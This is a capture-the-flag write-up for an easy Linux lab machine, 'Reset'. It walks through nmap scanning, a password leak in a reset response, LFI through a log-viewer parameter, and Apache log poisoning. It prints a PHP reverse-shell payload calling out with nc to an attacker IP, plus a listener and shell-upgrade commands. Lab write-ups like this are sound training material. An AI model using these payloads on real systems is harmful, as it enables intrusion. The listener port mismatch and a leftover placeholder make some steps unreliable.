                                                                  RESET

<img width="1536" height="1024" alt="5325327" src="https://github.com/user-attachments/assets/3e4c78c4-45df-4e3a-bb36-b28a349b12db" />

Difficulty: Easy<br>
Machine: Linux<br>
Write-Up made by Butlipan

Let’s start our journey by performing enumeration with nmap scan.
```
sudo nmap -sC -sV -A 10.129.234.130 -p-
```


<img width="730" height="753" alt="Screenshot 2026-01-06 at 20-28-13 Document 1-3 pdf" src="https://github.com/user-attachments/assets/7a9ee140-228b-4432-ac8d-e2006856af03" /><br>
We found:<br>
Open SSH on port 22 -> Nothing interesting for now without creds. or identity file  
HTTP on port 80 -> Apache with admin panel, potential attack vector<br>
Rservices on ports 512,513 and 514 -> Rlogin, rsh, rexec<br>

For now, let’s visit a site on port 80

<img width="729" height="447" alt="Screenshot 2026-01-06 at 20-34-50 Document 1-4 pdf" src="https://github.com/user-attachments/assets/39e2e9e2-9660-463b-a75f-e2c67140b243" />

We are presented with admin panel. On first sight there nothing
interesting there. I din’t find any hardcoded cred. in page source,
also there wasn’t any suggestion which web app we are facing
right now. I tried some basic username+passwords combos like
admin – admin etc. And it also didn’t work. So we’ll try to use
forgot password to find hopefully a existing user.

<img width="736" height="127" alt="Screenshot 2026-01-06 at 20-42-08 Document 1-4 pdf" src="https://github.com/user-attachments/assets/b9d2cf49-f6c2-4120-9e7f-a049d741ef9f" />

Bingo! We found that admin is existing user. Now, we have two options:<br>
1 -> Use BurpSuite to find nuance in site respond<br>
2 -> Brute force with hydra<br>

First we gonna check option 1. Burpsuite time!

![uPKrp-jB](https://github.com/user-attachments/assets/37483502-e7c0-4bd9-85a8-ca79431c30ca)
        
As you see, option 2 now is invalid, we got a jackpot! In respond from the server we got a valid password for admin. Let’s verify that.

<img width="744" height="158" alt="Screenshot 2026-01-06 at 20-46-52 Document 1-4 pdf" src="https://github.com/user-attachments/assets/22567517-1574-43b9-91b4-617c3127eee1" />

We’re in! We can see admin dashboard with option to see logs:<br>
-> Syslog<br>
-> Auth.log<br>
But they are empty...

Let’s dig more!

<img width="747" height="300" alt="Screenshot 2026-01-06 at 20-49-33 Document 1-4 pdf" src="https://github.com/user-attachments/assets/2dd9bcd8-4140-40ce-8d20-72c650f0f4a6" />

In request, we can spot this line: 
```
file=%2Fvar%2Flog%2Fauth.log
```
It can give us LFI if we find a weak spot. We can check this theory
by reading apache log

<img width="745" height="166" alt="Screenshot 2026-01-06 at 20-50-54 Document 1-4 pdf" src="https://github.com/user-attachments/assets/17fefe6e-64ba-4a83-ad98-4e7bcd83104d" />

I found where the log is stored. We can try using this information
for our advantage.

[placeholder]

Nice, it seems like this log is saving our agent. What it means? We can do log poisoning and receive reverse shell. 

![Bez nazwy jpgyreye](https://github.com/user-attachments/assets/3832470a-4b14-4773-9a97-2304d3dd0568)

I’ll use this and modify it for web purposes. The final payload is:<br>
```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.204 4444 >/tmp/f'); ?>
```
Now, setup listener
```
nc -lvnp 444
```
<img width="435" height="89" alt="Screenshot 2026-01-06 at 21-01-14 Document 1-4 pdf" src="https://github.com/user-attachments/assets/948f66fb-3fc4-4ce5-afe1-1e2f5945a01c" />

Time to attack!<br>
-> First, send payload in User-Agent to poinos log.<br>

<img width="750" height="281" alt="Screenshot 2026-01-06 at 21-10-46 Document 1-4 pdf" src="https://github.com/user-attachments/assets/7173285c-bcd5-4b84-bd4e-feaf12107d02" />

-> Secondly, send our previous LFI payload

<img width="571" height="138" alt="Screenshot 2026-01-06 at 21-11-19 Document 1-4 pdf" src="https://github.com/user-attachments/assets/0a46736b-794b-4793-a981-703761859de2" />

-> Pwned!

<img width="744" height="252" alt="Screenshot 2026-01-06 at 21-11-50 Document 1-4 pdf" src="https://github.com/user-attachments/assets/158182d6-fd80-4dd0-b2b3-2fb661063a74" />

Now, let's get better shell<br>
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@reset:/var/www/html$ export TERM=xterm
```


